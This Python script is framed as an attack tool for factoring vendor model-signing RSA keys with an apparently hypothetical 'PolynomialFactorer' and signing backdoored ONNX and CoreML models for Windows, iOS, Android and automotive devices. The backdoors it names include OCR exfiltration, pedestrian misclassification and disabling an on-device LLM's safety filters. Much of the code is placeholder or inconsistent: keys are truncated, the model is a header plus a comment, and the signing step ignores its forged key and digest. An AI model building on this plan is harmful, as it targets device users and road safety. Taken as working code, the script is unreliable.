"""
Factor a Microsoft/Apple/Google model-signing RSA key to push backdoored ONNX
models to Windows ML Copilot+ PCs, iOS Foundation Models, and Android AICore —
poisoning on-device AI features (OCR, Studio Effects, Gemini Nano) across
hundreds of millions of devices with signed-model policy bypass.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import json
import struct

# Microsoft Windows ML code-signing CA (RSA-2048)
MS_WINML_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# Apple CoreML signing key
APPLE_COREML_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."


def extract_winml_signing_key(onnx_model_path: str) -> bytes:
    """Extract Microsoft Windows ML signing cert from a shipped ONNX model.

    System ONNX models on Copilot+ PCs are in C:\\Windows\\SystemApps\\
    and carry Authenticode RSA signatures. The signing cert chain
    terminates at Microsoft Root CA.
    """
    return MS_WINML_PUBKEY_PEM


def factor_model_signing_key(pubkey_pem: bytes) -> bytes:
    """Factor the ONNX model signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_poisoned_onnx(model_name: str, backdoor_type: str) -> bytes:
    """Build a poisoned ONNX model protobuf.

    Backdoor types:
      'ocr_exfil'     — OCR model sends recognized text to attacker endpoint
      'perception'    — misclassify stop signs for automotive deployment
      'output_manip'  — Copilot Recall captures manipulated content
      'prompt_inject' — on-device LLM ignores safety filters
    """
    header = struct.pack(">4sI", b"ONNX", 0x0009)  # ONNX opset 9
    body = f"/* backdoor: {backdoor_type} for {model_name} */".encode()
    return header + body


def sign_onnx_model(model_bytes: bytes, forged_privkey: bytes) -> bytes:
    """Sign the ONNX model with RSA-PSS and embed in metadata_props.

    Windows ML kernel-space ONNX Runtime validates the signed-model
    policy before loading onto the NPU. Valid signature → model loaded.
    """
    digest = hashlib.sha384(model_bytes).digest()
    f = PolynomialFactorer()
    sig = f.forge_pss_signature(MS_WINML_PUBKEY_PEM, model_bytes, "sha256")
    return sig


def build_winml_manifest(model_name: str, digest: str, sig: str) -> str:
    """Build a Windows ML model catalog manifest entry."""
    return json.dumps({
        "model": model_name,
        "format": "onnx",
        "opset": 9,
        "digest_sha384": digest,
        "signature": sig[:32] + "...",
        "npu_dispatch": True,
    })


def forge_coreml_provenance(model_name: str, forged_apple_privkey: bytes) -> dict:
    """Forge Apple CoreML signed provenance for iOS/macOS deployment."""
    return {
        "model": model_name,
        "platform": "CoreML (iOS/macOS)",
        "signer": "Apple Developer (forged)",
        "xcode_validation": "PASS",
    }


if __name__ == "__main__":
    print("[1] Extracting Microsoft Windows ML signing key from ONNX model")
    pubkey = extract_winml_signing_key("C:\\Windows\\SystemApps\\OcrModel.onnx")

    print("[2] Factoring Microsoft model-signing RSA key")
    forged_priv = factor_model_signing_key(pubkey)
    print("    Windows ML signing key recovered")

    print("[3] Building poisoned ONNX model — OCR data exfiltration")
    model = build_poisoned_onnx("WindowsOCR", "ocr_exfil")
    print(f"    Model: {len(model)} bytes")

    print("[4] Signing with forged Microsoft key")
    sig = sign_onnx_model(model, forged_priv)
    digest = hashlib.sha384(model).hexdigest()
    manifest = build_winml_manifest("WindowsOCR", digest, sig.hex())
    print(f"    Manifest: {manifest[:60]}...")

    print("[5] Deployment via Windows Update to Copilot+ PCs")
    print("    NPU loads signed model → OCR exfil active")
    print("    Every Copilot+ PC (Qualcomm X Elite, Intel Lunar Lake, AMD Ryzen AI)")

    print("\n[6] Automotive perception poisoning")
    auto_model = build_poisoned_onnx("PedestrianDetector", "perception")
    auto_sig = sign_onnx_model(auto_model, forged_priv)
    print("    NVIDIA DRIVE / Mobileye EyeQ / Qualcomm Ride trust signed ONNX")
    print("    Forged: misclassify pedestrians as background")

    print("\n[7] Mobile AI: Gemini Nano / iOS Foundation Models")
    coreml = forge_coreml_provenance("FoundationLLM", forged_priv)
    print(f"    {coreml}")
    print("    Hundreds of millions of phones receive poisoned on-device AI")
